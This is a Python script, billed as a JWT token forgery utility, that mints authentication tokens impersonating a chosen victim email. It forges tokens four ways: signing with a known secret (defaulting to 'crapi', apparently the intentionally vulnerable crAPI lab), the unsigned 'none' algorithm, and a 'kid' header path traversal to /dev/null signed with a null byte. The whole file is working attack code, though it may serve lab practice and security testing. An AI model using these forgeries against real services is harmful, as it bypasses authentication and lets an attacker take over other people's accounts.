#!/usr/bin/env python3
"""
JWT Token Forgery Utility
Forge valid JWT tokens when you know the secret key.

Usage:
    uv run jwt_forge.py <email> [secret]

Example:
    uv run jwt_forge.py victim@example.com crapi
"""

import hmac
import hashlib
import base64
import json
import time
import sys


def base64url_encode(data):
    """Base64 URL-safe encoding without padding"""
    if isinstance(data, str):
        data = data.encode("utf-8")
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("utf-8")


def base64url_decode(data):
    """Base64 URL-safe decoding with padding"""
    padding = 4 - len(data) % 4
    if padding != 4:
        data += "=" * padding
    return base64.urlsafe_b64decode(data)


def decode_jwt(token):
    """Decode a JWT token without verification"""
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("Invalid JWT format")

    header = json.loads(base64url_decode(parts[0]))
    payload = json.loads(base64url_decode(parts[1]))
    return header, payload, parts[2]


def forge_jwt_hs256(payload, secret):
    """Forge a JWT using HS256"""
    header = {"alg": "HS256", "typ": "JWT"}
    header_b64 = base64url_encode(json.dumps(header, separators=(",", ":")))
    payload_b64 = base64url_encode(json.dumps(payload, separators=(",", ":")))

    message = f"{header_b64}.{payload_b64}"
    signature = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()

    return f"{message}.{base64url_encode(signature)}"


def forge_jwt_hs512(payload, secret):
    """Forge a JWT using HS512"""
    header = {"alg": "HS512"}
    header_b64 = base64url_encode(json.dumps(header, separators=(",", ":")))
    payload_b64 = base64url_encode(json.dumps(payload, separators=(",", ":")))

    message = f"{header_b64}.{payload_b64}"
    signature = hmac.new(secret.encode(), message.encode(), hashlib.sha512).digest()

    return f"{message}.{base64url_encode(signature)}"


def forge_jwt_none(payload):
    """Forge a JWT using 'none' algorithm (no signature)"""
    header = {"alg": "none", "typ": "JWT"}
    header_b64 = base64url_encode(json.dumps(header, separators=(",", ":")))
    payload_b64 = base64url_encode(json.dumps(payload, separators=(",", ":")))

    return f"{header_b64}.{payload_b64}."


def forge_jwt_kid_bypass(payload):
    """Forge a JWT using kid path traversal to /dev/null"""
    header = {"alg": "HS256", "kid": "../../../../../../dev/null"}
    header_b64 = base64url_encode(json.dumps(header, separators=(",", ":")))
    payload_b64 = base64url_encode(json.dumps(payload, separators=(",", ":")))

    message = f"{header_b64}.{payload_b64}"
    # Sign with empty key (null byte)
    signature = hmac.new(b"\x00", message.encode(), hashlib.sha256).digest()

    return f"{message}.{base64url_encode(signature)}"


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <email> [secret]")
        print(f"Example: {sys.argv[0]} victim@example.com crapi")
        sys.exit(1)

    email = sys.argv[1]
    secret = sys.argv[2] if len(sys.argv) > 2 else "crapi"

    # Create payload
    payload = {
        "sub": email,
        "iat": int(time.time()),
        "exp": int(time.time()) + 86400 * 365,  # 1 year
    }

    print(f"Email: {email}")
    print(f"Secret: {secret}")
    print(f"Expiry: 1 year from now")
    print()

    # Generate tokens with different algorithms
    print("=== HS256 Token ===")
    token_hs256 = forge_jwt_hs256(payload, secret)
    print(token_hs256)
    print()

    print("=== HS512 Token ===")
    token_hs512 = forge_jwt_hs512(payload, secret)
    print(token_hs512)
    print()

    print("=== None Algorithm Token ===")
    token_none = forge_jwt_none(payload)
    print(token_none)
    print()

    print("=== KID Path Traversal Token ===")
    token_kid = forge_jwt_kid_bypass(payload)
    print(token_kid)
    print()

    # Verify decoding
    print("=== Decoded HS512 Token ===")
    header, decoded_payload, sig = decode_jwt(token_hs512)
    print(f"Header: {json.dumps(header)}")
    print(f"Payload: {json.dumps(decoded_payload)}")


if __name__ == "__main__":
    main()
